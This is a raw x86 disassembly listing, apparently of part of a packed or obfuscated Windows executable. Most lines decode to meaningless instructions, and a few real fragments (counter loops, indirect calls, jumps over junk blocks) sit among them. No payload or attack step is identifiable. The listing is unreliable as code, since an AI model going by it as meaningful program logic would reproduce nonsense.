  411f7f:	xor    ch,BYTE PTR [eax+0x25510d2e]
  411f85:	loop   0x411f0e
  411f87:	pushf  
  411f88:	nop
  411f89:	dec    esp
  411f8a:	in     eax,dx
  411f8b:	popf   
  411f8c:	ins    DWORD PTR es:[edi],dx
  411f8d:	not    BYTE PTR [esi]
  411f8f:	shr    bl,cl
  411f91:	pop    ds
  411f92:	mov    cl,0x9b
  411f94:	pop    esi
  411f95:	push   ecx
  411f96:	cli    
  411f97:	mov    ds:0xc94882a5,eax
  411f9c:	mov    WORD PTR [ecx-0x2216bfcf],es
  411fa2:	dec    eax
  411fa3:	mov    ch,0xc4
  411fa5:	xchg   ecx,eax
  411fa6:	std    
  411fa7:	enter  0x28bc,0x69
  411fab:	xchg   edi,eax
  411fac:	sbb    esp,DWORD PTR [eax+0x10fa225b]
  411fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fb3:	sub    eax,0x617a04e
  411fb8:	push   ss
  411fb9:	mov    BYTE PTR [eax-0x6f14ff66],cl
  411fbf:	sbb    DWORD PTR ds:0xb34b9957,ecx
  411fc5:	mov    dh,0x44
  411fc7:	xchg   BYTE PTR [ecx+eax*4-0x5227562],cl
  411fce:	jg     0x412007
  411fd0:	jne    0x411fc6
  411fd2:	mov    ch,0x8d
  411fd4:	push   ss
  411fd5:	xor    ecx,ecx
  411fd7:	shr    BYTE PTR [eax],0xc2
  411fda:	test   DWORD PTR [edi+0x3f07c38],esi
  411fe0:	jb     0x412019
  411fe2:	ret    0xde7b
  411fe5:	push   esi
  411fe6:	(bad)  
  411fe8:	call   0x63c3bcab
  411fed:	int3   
  411fee:	jo     0x411f75
  411ff0:	xor    al,bl
  411ff2:	push   ss
  411ff3:	adc    bl,bh
  411ff5:	shl    DWORD PTR [ecx+ebp*1],1
  411ff8:	jns    0x41206a
  411ffa:	jmp    0x411fba
  411ffc:	test   al,0xc9
  411ffe:	sysret 
  412000:	fnstsw WORD PTR [ebx-0x396a9a29]
  412006:	push   edx
  412007:	stc    
  412008:	in     eax,0x91
  41200a:	nop
  41200b:	push   esp
  41200c:	push   0x6b
  41200e:	and    al,0x5b
  412010:	call   0xe9d73f4a
  412015:	add    edx,DWORD PTR [esi+0x7e]
  412018:	daa    
  412019:	and    ah,al
  41201b:	retf   0xd335
  41201e:	mov    cs,WORD PTR [edx]
  412020:	leave  
  412021:	pop    esi
  412022:	sahf   
  412023:	push   edx
  412024:	xlat   BYTE PTR ds:[ebx]
  412025:	push   es
  412026:	cmp    ebx,DWORD PTR [edx]
  412028:	test   al,0x7c
  41202a:	repnz mov BYTE PTR [esp+edx*1-0x400494d9],al
  412032:	sahf   
  412033:	stos   DWORD PTR es:[edi],eax
  412034:	in     al,0x7
  412036:	neg    DWORD PTR [ecx]
  412038:	xor    esp,edx
  41203a:	imul   edi,edx,0xd48de662
  412040:	(bad)  
  412041:	(bad)  
  412042:	xor    eax,DWORD PTR [esi+0x7b]
  412045:	jmp    0x411fe9
  412047:	jl     0x4120a9
  412049:	out    0xf3,eax
  41204b:	test   eax,0x765963d9
  412050:	test   eax,0x11cc3912
  412055:	cmp    ah,BYTE PTR [edx+0x5df12459]
  41205b:	or     edx,DWORD PTR [ebx-0x537595a1]
  412061:	sub    eax,0x5f2b586a
  412066:	jo     0x4120cf
  412068:	not    BYTE PTR [esi-0x25]
  41206b:	pop    ds
  41206c:	cmp    al,0x39
  41206e:	sbb    ebp,ebx
  412070:	push   ds
  412071:	pop    edx
  412072:	xchg   edx,eax
  412073:	adc    BYTE PTR [ebx],cl
  412075:	popf   
  412076:	std    
  412077:	mov    ebx,0x92770faa
  41207c:	test   eax,0xfd16e1f7
  412081:	adc    eax,0x681279bc
  412086:	add    DWORD PTR [edi],edx
  412088:	mov    bh,0xf3
  41208a:	or     eax,0xb2147fb7
  41208f:	xchg   ebp,eax
  412090:	mov    ebx,0xa34af275
  412095:	lock dec BYTE PTR [edx]
  412098:	inc    eax
  412099:	adc    BYTE PTR [eax-0x2f],0x3f
  41209d:	and    eax,0x54c21fed
  4120a2:	lahf   
  4120a3:	sbb    BYTE PTR [edi+0x1fc706da],ch
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fe76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fdd5
  4120d3:	adc    DWORD PTR ds:0x42e7ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e7eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e803,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e7fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e7fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e7fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fe7e
  412121:	push   0x0
  412123:	push   0x42e36d
  412128:	call   DWORD PTR ds:0x42e583
  41212e:	mov    ebx,DWORD PTR ds:0x42e7fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e7fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e220,0x42fe01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	repnz inc edx
  41216f:	xor    esp,ebx
  412171:	inc    esi
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x1b70707e
  41217a:	and    esi,ebx
  41217c:	test   al,0x67
  41217e:	(bad)  
  41217f:	sar    ebp,0x39
  412182:	dec    ebx
  412183:	or     DWORD PTR [edx+0x18],esp
  412186:	mov    esp,0x122f6cdf
  41218b:	mov    dl,BYTE PTR [ebx-0x1b950207]
  412191:	js     0x412146
  412193:	enter  0xe23b,0xad
  412197:	push   cs
  412198:	and    BYTE PTR [edi+edx*8+0xd],al
  41219c:	int    0x95
  41219e:	or     BYTE PTR [esi],0x25
  4121a1:	inc    esp
  4121a2:	ins    BYTE PTR es:[edi],dx
  4121a3:	sbb    BYTE PTR [edx+0x63],dl
  4121a6:	mov    edx,0x5571d223
  4121ab:	ret    
  4121ac:	xchg   ebx,eax
  4121ad:	fisubr DWORD PTR [ebp+0x4491fd81]
  4121b3:	adc    cl,dl
  4121b5:	pop    ds
  4121b6:	retf   0xa1f
  4121b9:	mov    ecx,0xe5572e0b
  4121be:	rol    DWORD PTR [esi-0x68],0x73
  4121c2:	iret   
  4121c3:	and    BYTE PTR [edx+0x70],bl
  4121c6:	jmp    0xc141:0xb20398a7
  4121cd:	xlat   BYTE PTR ds:[ebx]
  4121ce:	les    ebp,FWORD PTR [edi+0x4e]
  4121d1:	mov    ds:0xd823640b,eax
  4121d6:	jp     0x41215f
  4121d8:	gs repz fmul st,st(5)
  4121dc:	mov    esp,0x992dfb48
  4121e1:	inc    eax
  4121e2:	(bad)  [esp+eax*1-0x8]
  4121e6:	cmp    al,0xcf
  4121e8:	jns    0x412187
  4121ea:	jb     0x412231
  4121ec:	mov    ebp,0x70a7a2d9
  4121f1:	out    dx,eax
  4121f2:	push   ebx
  4121f3:	mov    ah,0xcc
  4121f5:	mov    al,ds:0xd8f687a9
  4121fa:	mov    ecx,0x5a91739e
  4121ff:	fwait
  412200:	retf   
  412201:	inc    edx
  412202:	cmp    esi,DWORD PTR [edx-0xf]
  412205:	test   BYTE PTR [eax],al
  412207:	outs   dx,DWORD PTR ds:[esi]
  412208:	mov    ebx,0xad4330e1
  41220d:	mov    ebp,0x8f8f50ab
  412212:	dec    ebx
  412213:	lock mov esp,0x91c85624
  412219:	cmp    eax,ebx
  41221b:	cmp    BYTE PTR [ebp+0x1d5fc145],ah
  412221:	inc    esp
  412222:	mov    eax,ds:0xe4bf1368
  412227:	in     eax,dx
  412228:	ret    0x95c7
  41222b:	mov    esi,0xb0414a9
  412230:	push   esi
  412231:	or     BYTE PTR ds:0x9ef0352d,0xf5
  412238:	stos   DWORD PTR es:[edi],eax
  412239:	dec    ecx
  41223a:	pop    ds
  41223b:	xor    esi,DWORD PTR [ecx]
  41223d:	inc    esp
  41223e:	cs push ebp
  412240:	shr    DWORD PTR [edi+0x50],1
  412243:	ficom  WORD PTR [edx+0x46]
  412246:	lds    esp,FWORD PTR [ecx+ebp*4-0x9]
  41224a:	das    
  41224b:	sub    eax,0xc702e550
  412250:	in     al,0xb5
  412252:	ror    DWORD PTR [edi-0x381b464a],1
  412258:	adc    DWORD PTR [edx+ebp*4],0xffffffc1
  41225c:	xchg   ebx,eax
  41225d:	or     al,0xaf
  41225f:	and    bh,ch
  412261:	mov    bh,0x51
  412263:	aam    0xf8
  412265:	jne    0x412223
  412267:	or     BYTE PTR [esi+ebx*4+0x16],0x3e
  41226c:	pop    ebp
  41226d:	xchg   BYTE PTR [eax-0x49],dh
  412270:	xchg   edx,eax
  412271:	leave  
  412272:	test   BYTE PTR [ebx-0x45067845],cl
  412278:	retf   0x48d7
  41227b:	mov    al,0x52
  41227d:	sub    ecx,edi
  41227f:	sbb    BYTE PTR [ebp-0x7e],0xa3
  412283:	and    BYTE PTR [ecx],al
  412285:	in     al,0xb4
  412287:	in     al,dx
  412288:	jmp    DWORD PTR [edi*1-0x70be97a4]
  41228f:	push   esp
  412290:	das    
  412291:	jbe    0x4122ed
  412293:	mov    ds:0x819ec885,al
  412298:	dec    eax
  412299:	fistp  QWORD PTR [edi-0x66]
  41229c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41229d:	or     al,0x89
  41229f:	mov    BYTE PTR [ebx-0x75],0x16
  4122a3:	fild   QWORD PTR [ebp-0x1c]
  4122a6:	outs   dx,BYTE PTR ds:[esi]
  4122a7:	call   0xc7b3:0x1fc5adfe
  4122ae:	jmp    0x67b5:0x60a7570e
  4122b5:	fisub  DWORD PTR [edx-0xa6c2b8e]
  4122bb:	sub    DWORD PTR [ebx],0xffffffe0
  4122be:	aas    
  4122bf:	shl    DWORD PTR [ebx+ecx*2+0x4],cl
  4122c3:	dec    esp
  4122c4:	cmp    BYTE PTR [edi],bh
  4122c6:	dec    edi
  4122c7:	add    al,0x53
  4122c9:	push   ebx
  4122ca:	sbb    DWORD PTR [ecx+0x24dc9725],ecx
  4122d0:	push   ecx
  4122d1:	or     bh,BYTE PTR [ecx+0x66]
  4122d4:	jne    0x4122c3
  4122d6:	push   ebp
  4122d7:	ds pushf 
  4122d9:	sub    eax,0xb658247d
  4122de:	stos   DWORD PTR es:[edi],eax
  4122df:	push   esi
  4122e0:	aaa    
  4122e1:	cmp    DWORD PTR [esi],eax
  4122e3:	scas   al,BYTE PTR es:[edi]
  4122e4:	ror    esp,cl
  4122e6:	dec    ecx
  4122e7:	dec    edx
  4122e8:	punpcklwd mm0,DWORD PTR [esi+0x27]
  4122ec:	ss loopne 0x4122a2
  4122ef:	aas    
  4122f0:	popa   
  4122f1:	adc    DWORD PTR [ebx-0x42],ebp
  4122f4:	bound  ebx,QWORD PTR [ecx+0x75]
  4122f7:	sbb    al,0x6f
  4122f9:	jmp    0x412316
  4122fb:	fmul   QWORD PTR [edx+0x9ebeb2c]
  412301:	lahf   
  412302:	mov    ds:0x2a68ee9c,eax
  412307:	scas   al,BYTE PTR es:[edi]
  412308:	push   edi
  412309:	lea    ecx,[eax-0x275a3ddf]
  41230f:	addr16 mov al,ds:0xd57d
  412313:	or     dl,bh
  412315:	(bad)  
  412316:	stc    
  412317:	push   edi
  412318:	test   eax,0xdbab535
  41231d:	xchg   ebx,eax
  41231e:	stos   BYTE PTR es:[edi],al
  41231f:	sbb    eax,0x6fee03c1
  412324:	popa   
  412325:	jge    0x41234c
  412327:	icebp  
  412328:	rol    BYTE PTR [eax+eax*2-0x5f86d4a5],0x11
  412330:	pop    edi
  412331:	and    BYTE PTR [ebx-0x44bf616e],bl
  412337:	or     BYTE PTR [ebx],bl
  412339:	sub    eax,0xd48e06c5
  41233e:	push   ds
  41233f:	or     DWORD PTR [eax-0x39],edx
  412342:	mov    WORD PTR [ebx+0x4e11c9ca],cs
  412348:	cdq    
  412349:	mov    eax,DWORD PTR [ecx-0x10]
  41234c:	nop
  41234d:	jmp    0x35da:0x99fb21d1
  412354:	cld    
  412355:	cwde   
  412356:	int    0x68
  412358:	mov    ds:0x9458fe0,eax
  41235d:	fiadd  DWORD PTR [edi-0x5d3df623]
  412363:	lock cmp ch,BYTE PTR [esi+0x58d14b93]
  41236a:	das    
  41236b:	and    DWORD PTR [edx],esi
  41236d:	hlt    
  41236e:	imul   ecx,esp,0x311c0eb3
  412374:	call   0x4c3088cd
  412379:	stos   DWORD PTR es:[edi],eax
  41237a:	mov    esp,0xcc0d69d8
  41237f:	cli    
  412380:	popf   
  412381:	ins    BYTE PTR es:[edi],dx
  412382:	pusha  
  412383:	mov    WORD PTR [edi],ss
  412385:	cmp    eax,0xb4ad168b
  41238a:	shr    eax,cl
  41238c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41238d:	jno    0x41239c
  41238f:	in     al,dx
  412390:	test   DWORD PTR [edx-0x705c9d01],ecx
  412396:	and    esp,DWORD PTR [ebx-0x265c492c]
  41239c:	dec    ecx
  41239d:	imul   DWORD PTR [ebx+0x6c3de1cb]
  4123a3:	cld    
  4123a4:	enter  0x4fc0,0xe1
  4123a8:	imul   BYTE PTR [edx]
  4123aa:	jno    0x412358
  4123ac:	rcr    BYTE PTR [ecx-0x584b6bf6],0xf5
  4123b3:	imul   edx,DWORD PTR [edi+0x50a5a3b2],0xb20d1445
  4123bd:	xchg   edi,eax
  4123be:	enter  0xee80,0xcd
  4123c2:	pop    ecx
  4123c3:	inc    esi
  4123c4:	aam    0x81
  4123c6:	int    0x99
  4123c8:	rol    dl,1
  4123ca:	cmp    DWORD PTR [edi],ecx
  4123cc:	icebp  
  4123cd:	imul   ebx,DWORD PTR [ebx+0x7a],0xffffffb2
  4123d1:	mov    eax,ds:0x4aa42c54
  4123d6:	pop    ds
  4123d7:	or     cl,ah
  4123d9:	jns    0x412418
  4123db:	loopne 0x4123a1
  4123dd:	fsubr  DWORD PTR [edi+0x6c2e67b7]
  4123e3:	and    eax,0x777497d8
  4123e8:	out    0x90,eax
  4123ea:	stos   BYTE PTR es:[edi],al
  4123eb:	mov    ebp,0xeeaa201f
  4123f0:	stos   BYTE PTR es:[edi],al
  4123f1:	cmc    
  4123f2:	cmc    
  4123f3:	sub    BYTE PTR [edx+0xd],dl
  4123f6:	leave  
  4123f7:	cmp    eax,DWORD PTR [ebp+ebx*4+0x3c21fb44]
  4123fe:	push   ebp
  4123ff:	idiv   dl
  412401:	jp     0x412387
  412403:	out    0x98,eax
  412405:	dec    ebx
  412406:	icebp  
  412407:	mov    al,0xac
  412409:	aam    0xcf
  41240b:	mov    eax,0x60904213
  412410:	mov    esp,0x77a7f34d
  412415:	xchg   edi,eax
  412416:	mov    WORD PTR [ecx],fs
  412418:	mov    BYTE PTR [edi+0x23],dl
  41241b:	pushf  
  41241c:	and    al,0x8a
  41241e:	loope  0x412488
  412420:	dec    esp
  412421:	xor    edi,ecx
  412423:	add    DWORD PTR [ecx],ebp
  412425:	in     al,dx
  412426:	daa    
  412427:	clc    
  412428:	push   cs
  412429:	mov    dh,0x47
  41242b:	pop    ss
  41242c:	test   BYTE PTR [esi+0x4f],ah
  41242f:	cmp    BYTE PTR [ebx],bl
  412431:	into   
  412432:	fwait
  412433:	in     al,dx
  412434:	call   0x5226e38a
  412439:	jnp    0x412429
  41243b:	adc    edx,DWORD PTR [eax]
  41243d:	out    dx,al
  41243e:	push   es
  41243f:	mov    WORD PTR [ebx],es
  412441:	retf   
  412442:	sub    DWORD PTR ds:0x42fdf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	adc    BYTE PTR [ebx+0x7f],0x2f
  412461:	(bad)  
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xd570707e
  41246a:	add    DWORD PTR [ebx-0x488df447],ecx
  412470:	repz mov ?,WORD PTR [esp+esi*2-0x5b]
  412475:	push   esp
  412476:	push   esp
  412477:	fisttp WORD PTR [ebx]
  412479:	mov    WORD PTR [edi+0x5bb18d7b],ds
  41247f:	shl    BYTE PTR [eax-0x6b53c4e5],0x48
  412486:	outs   dx,DWORD PTR ds:[esi]
  412487:	(bad)  
  412488:	mov    bl,0x65
  41248a:	sub    eax,0xb4b36d67
  41248f:	mov    ?,esp
  412491:	xlat   BYTE PTR ds:[ebx]
  412492:	jg     0x412445
  412494:	lock das 
  412496:	fwait
  412497:	repz pop ebx
  412499:	dec    ecx
  41249a:	xchg   bl,ah
  41249c:	pop    ebx
  41249d:	cli    
  41249e:	mov    ch,0xf3
  4124a0:	xlat   BYTE PTR ds:[ebx]
  4124a1:	cmp    ebp,ecx
  4124a3:	sbb    eax,0xae50c6e
  4124a8:	test   BYTE PTR [ebp+edx*1+0x4240aa6b],ch
  4124af:	jge    0x41249b
  4124b1:	lods   al,BYTE PTR ds:[esi]
  4124b2:	push   0x3f
  4124b4:	sbb    ah,bl
  4124b6:	push   cs
  4124b7:	lahf   
  4124b8:	imul   eax,DWORD PTR [esi+0x71918fac],0xff46c71a
  4124c2:	in     eax,dx
  4124c3:	xor    DWORD PTR [eax-0x342530bb],ecx
  4124c9:	cmovnp ebp,DWORD PTR [ecx+0x6d]
  4124cd:	ins    BYTE PTR es:[edi],dx
  4124ce:	nop
  4124cf:	into   
  4124d0:	int3   
  4124d1:	fidiv  DWORD PTR [ebp+0x63]
  4124d4:	sbb    al,0xef
  4124d6:	into   
  4124d7:	xor    BYTE PTR [ebx-0x5e],0xfd
  4124db:	movlps xmm1,QWORD PTR [eax]
  4124de:	add    esi,DWORD PTR ds:[ecx]
  4124e1:	shr    BYTE PTR [eax+0x59691216],cl
  4124e7:	or     al,0xd7
  4124e9:	(bad)  
  4124ea:	(bad)  [ebp+0x16967a6e]
  4124f0:	in     al,dx
  4124f1:	or     DWORD PTR [edi+0x3e501b1f],0x9cc034f8
  4124fb:	xor    eax,DWORD PTR [ebx+0x4d]
  4124fe:	es dec ebx
  412500:	xor    dl,BYTE PTR [ecx]
  412502:	pop    ds
  412503:	cmp    DWORD PTR [ebx],ebx
  412505:	pop    ds
  412506:	pop    ss
  412507:	jno    0x4124a8
  412509:	call   0xe38a:0xcb05347
  412510:	aad    0x26
  412512:	mov    bl,0x4f
  412514:	loopne 0x412506
  412516:	(bad)  
  412517:	aad    0x60
  412519:	call   0x6ef8ee1d
  41251e:	ret    0xe288
  412521:	pusha  
  412522:	jl     0x41256a
  412524:	mov    cl,0x8
  412526:	test   BYTE PTR [ebp-0x21],dh
  412529:	and    al,0xb2
  41252b:	test   al,0xdc
  41252d:	sub    eax,0x525e45ca
  412532:	ret    0x7e16
  412535:	push   eax
  412536:	jnp    0x4124f4
  412538:	sbb    al,0xa2
  41253a:	enter  0x8a52,0x9f
  41253e:	outs   dx,DWORD PTR ds:[esi]
  41253f:	pusha  
  412540:	es xchg esp,ebx
  412543:	adc    bl,0x9f
  412546:	iret   
  412547:	(bad)  
  412549:	add    DWORD PTR [edx-0x73],edx
  41254c:	in     al,0x13
  41254e:	cmc    
  41254f:	fnstcw WORD PTR [esi+eiz*4+0x7c]
  412553:	in     al,0x16
  412555:	pop    edx
  412556:	fwait
  412557:	jmp    0x412513
  412559:	cdq    
  41255a:	mov    ds:0x1219a9e7,al
  41255f:	cmp    ebx,ebx
  412561:	out    dx,eax
  412562:	add    edx,DWORD PTR [edx+0x66]
  412565:	cmc    
  412566:	mov    ds:0xa4c5abd8,al
  41256b:	test   al,0x22
  41256d:	xchg   esi,eax
  41256e:	mov    esp,0x6d56ff35
  412573:	mov    BYTE PTR [edx+0x640904d3],bl
  412579:	sub    al,0x9c
  41257b:	jp     0x412545
  41257d:	in     eax,0x34
  41257f:	(bad)  
  412580:	ds cmc 
  412582:	(bad)  
  412583:	push   ebp
  412584:	jmp    0x41251f
  412586:	fimul  WORD PTR ds:[eax]
  412589:	stos   BYTE PTR es:[edi],al
  41258a:	arpl   dx,di
  41258c:	push   eax
  41258d:	mov    al,0x7a
  41258f:	and    al,BYTE PTR cs:[edx*4-0x13f70950]
  412597:	dec    ebx
  412598:	jecxz  0x41258c
  41259a:	xor    edi,DWORD PTR [eax]
  41259c:	inc    ebx
  41259d:	jae    0x412598
  41259f:	aad    0x3
  4125a1:	cmp    bl,BYTE PTR [ecx+eax*2-0x31486838]
  4125a8:	or     cl,BYTE PTR [edx-0x4edce46e]
  4125ae:	dec    edx
  4125b0:	fiadd  DWORD PTR [edi+0x4142e8c]
  4125b6:	fld    TBYTE PTR [esi-0x1255597]
  4125bc:	les    edx,FWORD PTR cs:[ecx+0x75ffdcd9]
  4125c3:	inc    esi
  4125c4:	dec    eax
  4125c5:	stos   DWORD PTR es:[edi],eax
  4125c6:	iret   
  4125c7:	outs   dx,BYTE PTR ds:[esi]
  4125c8:	and    al,0x2a
  4125ca:	jecxz  0x412599
  4125cc:	dec    edi
  4125cd:	inc    ebx
  4125ce:	retf   0xa40a
  4125d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125d2:	dec    ebx
  4125d3:	test   DWORD PTR [esi+0x5e],eax
  4125d6:	adc    ebp,eax
  4125d8:	fsubr  QWORD PTR [ebp+0x1f]
  4125db:	fs inc ebx
  4125dd:	(bad)  
  4125de:	test   ah,0x55
  4125e1:	pop    eax
  4125e2:	hlt    
  4125e3:	mov    cl,0x5d
  4125e5:	xlat   BYTE PTR ds:[ebx]
  4125e6:	mov    bl,0x87
  4125e8:	push   ebp
  4125e9:	mov    BYTE PTR [esp+eax*8+0x6a],dh
  4125ed:	pop    ebx
  4125ee:	mov    al,0xa9
  4125f0:	mov    edx,0x50c63d97
  4125f5:	stc    
  4125f6:	out    dx,eax
  4125f7:	fild   QWORD PTR [ebx+0x3bda3e1e]
  4125fd:	ret    
  4125fe:	pusha  
  4125ff:	jmp    0x41266a
  412601:	int    0x98
  412603:	push   0x521e73b7
  412608:	retf   0x8246
  41260b:	pop    ebp
  41260c:	and    ch,dl
  41260e:	nop
  41260f:	add    dh,ah
  412611:	add    ebp,edx
  412613:	push   edi
  412614:	sbb    BYTE PTR [edi-0x25],ah
  412617:	ds jp  0x4125b7
  41261a:	(bad)  [ebp-0x244dc23c]
  412620:	add    ebx,DWORD PTR [edx-0x3be8ecfc]
  412626:	jl     0x412685
  412628:	cs ret 
  41262a:	push   DWORD PTR [edx]
  41262c:	fmul   DWORD PTR [edx]
  41262e:	iret   
  41262f:	xchg   ebx,eax
  412630:	stos   DWORD PTR es:[edi],eax
  412631:	ds inc esi
  412633:	xchg   ebx,eax
  412634:	out    dx,eax
  412635:	pop    ecx
  412636:	jg     0x41262b
  412638:	jmp    0x4125bc
  41263a:	mov    edx,0xc66d3c98
  41263f:	xchg   esi,eax
  412640:	retf   
  412641:	pop    eax
  412642:	pop    ds
  412643:	pop    esp
  412644:	pop    ds
  412645:	xor    esi,edx
  412647:	loope  0x4126b5
  412649:	xor    bl,BYTE PTR [ebx+0xd]
  41264c:	ins    BYTE PTR es:[edi],dx
  41264d:	dec    edi
  41264e:	mov    al,ds:0x7a52e09
  412653:	cdq    
  412654:	pushf  
  412655:	clc    
  412656:	pop    esi
  412657:	pop    es
  412658:	xor    eax,DWORD PTR [ebx+0x65]
  41265b:	mov    bh,0xd8
  41265d:	enter  0x3808,0x7b
  412661:	adc    DWORD PTR [esi+ebp*1-0x7b],esp
  412665:	pop    ss
  412666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412667:	mov    ebp,0x7057bbd1
  41266c:	jno    0x4126d7
  41266e:	dec    eax
  41266f:	sbb    ch,bl
  412671:	retf   0x4af
  412674:	or     eax,0x956dfb0a
  412679:	and    cl,BYTE PTR [eax-0x13d2b3d4]
  41267f:	mov    dh,0xd
  412681:	or     edi,0x8
  412684:	jnp    0x412704
  412686:	adc    ch,BYTE PTR [ecx]
  412688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412689:	xor    BYTE PTR [esi-0x7c],ah
  41268c:	xchg   esi,eax
  41268d:	test   BYTE PTR [ecx-0x61d6c123],ah
  412693:	popa   
  412694:	and    al,0xe
  412696:	pop    esi
  412697:	pop    esp
  412698:	mov    ah,0x14
  41269a:	hlt    
  41269b:	popa   
  41269c:	mov    ?,WORD PTR [ecx-0x67]
  41269f:	sub    DWORD PTR [eax+edx*8-0x8fdd838],esi
  4126a6:	mov    ebx,ecx
  4126a8:	cld    
  4126a9:	in     al,dx
  4126aa:	cmp    eax,0x6d811ca7
  4126af:	add    cl,BYTE PTR [ecx+0x4c]
  4126b2:	fimul  DWORD PTR [ebp-0x15]
  4126b5:	mov    bh,BYTE PTR [edx]
  4126b7:	into   
  4126b8:	loope  0x412660
  4126ba:	dec    edi
  4126bb:	mov    eax,0xe131fa8f
  4126c0:	mov    ebp,0x714ce373
  4126c5:	out    dx,eax
  4126c6:	mov    ds:0x6070ed37,eax
  4126cb:	mov    ah,0x64
  4126cd:	mov    dl,0xa3
  4126cf:	sub    BYTE PTR [eax-0x1e],al
  4126d2:	je     0x41267d
  4126d4:	jp     0x412738
  4126d6:	clc    
  4126d7:	dec    esp
  4126d8:	repnz pop esp
  4126da:	xor    BYTE PTR [eax+esi*1],al
  4126dd:	jecxz  0x4126b1
  4126df:	sbb    dh,bl
  4126e1:	dec    ebp
  4126e2:	push   ds
  4126e3:	push   ss
  4126e4:	cs iret 
  4126e6:	mov    al,ah
  4126e8:	pusha  
  4126e9:	loope  0x41270b
  4126eb:	xchg   BYTE PTR [edi],bl
  4126ed:	pop    ebp
  4126ee:	push   esi
  4126ef:	addr16 pop eax
  4126f1:	ja     0x412711
  4126f3:	into   
  4126f4:	enter  0xff96,0xad
  4126f8:	xor    eax,0xe50d4fe2
  4126fd:	mov    cl,0x2d
  4126ff:	or     edi,DWORD PTR [esp+edi*1+0x21]
  412703:	push   0x68509b56
  412708:	sub    cl,bh
  41270a:	into   
  41270b:	sahf   
  41270c:	jl     0x41277f
  41270e:	mov    ch,0x21
  412710:	icebp  
  412711:	imul   edx,esi,0x85cf2cf0
  412717:	xchg   edx,eax
  412718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412719:	or     al,0x2
  41271b:	std    
  41271c:	sub    BYTE PTR [ecx],bl
  41271e:	(bad)  
  41271f:	enter  0x4fce,0x1f
  412723:	push   eax
  412724:	pushf  
  412725:	dec    esi
  412726:	(bad)  
  412727:	jb     0x412758
  412729:	xchg   esi,eax
  41272a:	jmp    0x412724
  41272c:	fcom   QWORD PTR [eax*8-0x1bb276bd]
  412733:	and    DWORD PTR ds:0x42fe76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fe76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fe76,ecx
  412751:	cmp    DWORD PTR ds:0x42fe76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fe76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e413
  41277c:	cmp    DWORD PTR ds:0x42fe76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fe76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fe76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fe6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    esi,DWORD PTR [ecx]
  4127be:	out    dx,eax
  4127bf:	and    al,BYTE PTR [esi]
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0xf570707e
  4127ca:	out    dx,eax
  4127cb:	repnz pop es
  4127cd:	sbb    al,0x90
  4127cf:	aas    
  4127d0:	addr16 jae 0x41283e
  4127d3:	ret    
  4127d4:	fst    DWORD PTR [edx+0x70ca2551]
  4127da:	scas   eax,DWORD PTR es:[edi]
  4127db:	adc    bh,BYTE PTR [ecx]
  4127dd:	dec    esp
  4127de:	inc    eax
  4127df:	adc    al,BYTE PTR [ebp+0x410d8c69]
  4127e5:	push   ebx
  4127e6:	push   ecx
  4127e7:	lods   al,BYTE PTR ds:[esi]
  4127e8:	push   0xffffffb5
  4127ea:	popa   
  4127eb:	test   al,0x24
  4127ed:	mov    ecx,0xae270eff
  4127f2:	loop   0x412842
  4127f4:	inc    dx
